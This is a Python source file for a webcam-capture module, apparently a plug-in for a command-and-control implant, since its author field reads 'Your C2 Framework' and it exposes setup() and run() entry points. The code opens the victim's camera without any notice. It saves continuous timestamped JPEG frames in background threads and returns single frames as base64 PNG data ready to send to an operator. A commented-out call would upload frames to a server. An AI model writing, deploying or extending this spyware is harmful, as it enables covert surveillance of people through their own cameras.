#!/usr/bin/env python3
import os
import sys
import platform
import logging
import cv2
import numpy as np
import base64
import threading
import time
from datetime import datetime
import queue
from io import BytesIO
from PIL import Image

class Webcam:
    def __init__(self):
        self.name = "webcam"
        self.description = "Capture webcam image"
        self.author = "Your C2 Framework"
        self.os_type = platform.system()
        self.setup_logging()
        self.is_running = False
        self.frame_queue = queue.Queue()
        self.capture_thread = None
        self.save_thread = None
        
    def setup_logging(self):
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('webcam.log'),
                logging.StreamHandler()
            ]
        )
        
    def capture_frames(self):
        """Capture frames from webcam"""
        try:
            cap = cv2.VideoCapture(0)
            if not cap.isOpened():
                logging.error("Failed to open webcam")
                return
                
            while self.is_running:
                ret, frame = cap.read()
                if ret:
                    self.frame_queue.put(frame)
                else:
                    logging.error("Failed to capture frame")
                    time.sleep(1)
                    
            cap.release()
            
        except Exception as e:
            logging.error(f"Error capturing frames: {str(e)}")
            
    def save_frames(self):
        """Save captured frames to files"""
        try:
            while self.is_running:
                if not self.frame_queue.empty():
                    frame = self.frame_queue.get()
                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                    filename = f"webcam_{timestamp}.jpg"
                    
                    # Save frame as JPEG
                    cv2.imwrite(filename, frame)
                    
                    # Optional: Upload to server
                    # self.upload_frame(filename)
                    
        except Exception as e:
            logging.error(f"Error saving frames: {str(e)}")
            
    def capture_single(self):
        """Capture a single frame"""
        try:
            cap = cv2.VideoCapture(0)
            if not cap.isOpened():
                logging.error("Failed to open webcam")
                return None
                
            ret, frame = cap.read()
            cap.release()
            
            if ret:
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"webcam_{timestamp}.jpg"
                cv2.imwrite(filename, frame)
                return filename
            return None
            
        except Exception as e:
            logging.error(f"Error capturing single frame: {str(e)}")
            return None
            
    def start(self):
        """Start continuous webcam capture"""
        try:
            self.is_running = True
            
            # Start capture thread
            self.capture_thread = threading.Thread(target=self.capture_frames)
            self.capture_thread.daemon = True
            self.capture_thread.start()
            
            # Start save thread
            self.save_thread = threading.Thread(target=self.save_frames)
            self.save_thread.daemon = True
            self.save_thread.start()
            
            logging.info("Started webcam capture")
            
        except Exception as e:
            logging.error(f"Error starting webcam capture: {str(e)}")
            
    def stop(self):
        """Stop webcam capture"""
        self.is_running = False
        if self.capture_thread:
            self.capture_thread.join()
        if self.save_thread:
            self.save_thread.join()
        logging.info("Stopped webcam capture")

    def capture_image(self):
        """
        Capture an image from the webcam
        """
        try:
            # Initialize webcam
            cap = cv2.VideoCapture(0)
            if not cap.isOpened():
                return {
                    "status": "error",
                    "error": "Could not open webcam",
                    "timestamp": datetime.now().isoformat()
                }

            # Capture frame
            ret, frame = cap.read()
            if not ret:
                return {
                    "status": "error",
                    "error": "Failed to capture image",
                    "timestamp": datetime.now().isoformat()
                }

            # Convert from BGR to RGB
            frame_rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
            
            # Convert to PIL Image
            image = Image.fromarray(frame_rgb)
            
            # Save to bytes
            img_bytes = BytesIO()
            image.save(img_bytes, format='PNG')
            img_bytes = img_bytes.getvalue()
            
            # Release webcam
            cap.release()
            
            # Encode to base64
            img_b64 = base64.b64encode(img_bytes).decode()
            
            return {
                "status": "success",
                "timestamp": datetime.now().isoformat(),
                "data": img_b64,
                "format": "png",
                "encoding": "base64"
            }
            
        except Exception as e:
            return {
                "status": "error",
                "error": str(e),
                "timestamp": datetime.now().isoformat()
            }
        finally:
            if 'cap' in locals():
                cap.release()

    def run(self, **kwargs):
        """
        Main execution method
        """
        return self.capture_image()

def setup():
    """
    Module initialization
    """
    return Webcam() 